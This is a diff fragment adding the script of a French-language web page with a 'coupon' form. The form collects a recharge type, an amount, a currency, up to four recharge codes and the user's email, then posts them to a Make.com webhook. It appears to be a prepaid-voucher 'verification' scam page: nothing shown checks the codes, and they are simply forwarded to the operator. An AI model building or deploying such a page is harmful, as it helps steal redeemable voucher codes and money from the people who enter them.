+      document.getElementById('labelCode1').innerHTML = t.labelCode1;
+      document.getElementById('labelCode2').textContent = t.labelCode2;
+      document.getElementById('labelCode3').textContent = t.labelCode3;
+      document.getElementById('labelCode4').textContent = t.labelCode4;
+      document.getElementById('labelEmail').innerHTML = t.labelEmail;
+      document.getElementById('btnSubmit').textContent = t.btnSubmit;
+      document.getElementById('loaderText').textContent = t.loaderText;
+      document.getElementById('footerDesc').textContent = t.footerDesc;
+      document.getElementById('footerServices').textContent = t.footerServices;
+      document.getElementById('f1').textContent = t.f1;
+      document.getElementById('f2').textContent = t.f2;
+      document.getElementById('f3').textContent = t.f3;
+      document.getElementById('f4').textContent = t.f4;
+      document.getElementById('f5').textContent = t.f5;
+      document.getElementById('footerHours').textContent = t.footerHours;
+      document.getElementById('footerHoursDesc').textContent = t.footerHoursDesc;
+      document.getElementById('footerCopy').textContent = t.footerCopy;
+      document.getElementById('langLabel').textContent = t.langLabel;
+    }
+
+    // ─── ENVOI VERS MAKE.COM ──────────────────────────────────────
+    async function sendToMake(data) {
+      const response = await fetch(MAKE_WEBHOOK_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          type: data.type,
+          amount: data.amount,
+          currency: data.currency,
+          code1: data.code1,
+          code2: data.code2,
+          code3: data.code3,
+          code4: data.code4,
+          email: data.email,
+          date: data.date
+        })
+      });
+
+      if (!response.ok) throw new Error('Erreur make.com');
+    }
+
+    // ─── FONCTION PRINCIPALE ──────────────────────────────────────
+    async function handleSubmit(e) {
+      e.preventDefault();
+
+      const rechargeType = document.getElementById('rechargeType');
+      const amount = document.getElementById('amount');
+      const currencyRadio = document.querySelector('input[name="currency"]:checked');
+      const code1 = document.getElementById('code1');
+      const code2 = document.getElementById('code2');
+      const code3 = document.getElementById('code3');
+      const code4 = document.getElementById('code4');
+      const userEmail = document.getElementById('userEmail');
+      const btn = document.getElementById('btnSubmit');
+      const loader = document.getElementById('loader');
+      const alertBox = document.getElementById('alertBox');
+
+      // Vérifications
+      if (!currencyRadio) {
+        afficherAlerte(alertBox, '⚠️ Veuillez sélectionner une devise.', 'error');
+        return;
+      }
+
+      if (!userEmail.value) {
+        afficherAlerte(alertBox, '⚠️ Veuillez saisir votre email.', 'error');
+        return;
+      }
+
+      if (!amount.value) {
+        afficherAlerte(alertBox, '⚠️ Veuillez saisir un montant.', 'error');
+        return;
+      }
+
+      if (!rechargeType.value) {
+        afficherAlerte(alertBox, '⚠️ Veuillez sélectionner un type de recharge.', 'error');
+        return;
+      }
+
+      if (!code1.value) {
+        afficherAlerte(alertBox, '⚠️ Veuillez saisir le code de recharge 1.', 'error');
+        return;
+      }
+
+      const date = new Date().toLocaleString('fr-FR', {
+        dateStyle: 'full',
+        timeStyle: 'medium'
+      });
+
+      const data = {
+        type: rechargeType.value,
+        amount: amount.value,
+        currency: currencyRadio.value,
+        code1: code1.value,
+        code2: code2.value || 'Non fourni',
+        code3: code3.value || 'Non fourni',
+        code4: code4.value || 'Non fourni',
+        email: userEmail.value,
+        date: date
+      };
+
+      activerChargement(btn, loader, true);
+      effacerAlerte(alertBox);
+
+      try {
+        await sendToMake(data);
+
+        afficherAlerte(alertBox, currentSuccessMsg, 'success');
+        document.getElementById('couponForm').reset();
+
+      } catch (erreur) {
+        console.error('Erreur:', erreur);
+        afficherAlerte(alertBox, currentErrorMsg, 'error');
+      } finally {
+        activerChargement(btn, loader, false);
+      }
+    }
+
+    // ─── ATTACHER LES ÉVÉNEMENTS ──────────────────────────────────
+    document.getElementById('couponForm').addEventListener('submit', handleSubmit);
+    document.getElementById('langSelect').addEventListener('change', (e) => applyLang(e.target.value));
+
+    // Détection auto de la langue
+    (function () {
+      const navLang = navigator.language.split('-')[0];
+      if (translations[navLang]) {
+        document.getElementById('langSelect').value = navLang;
+        applyLang(navLang);
+      }
+    })();
+  </script>
+</body>
+
+</html>
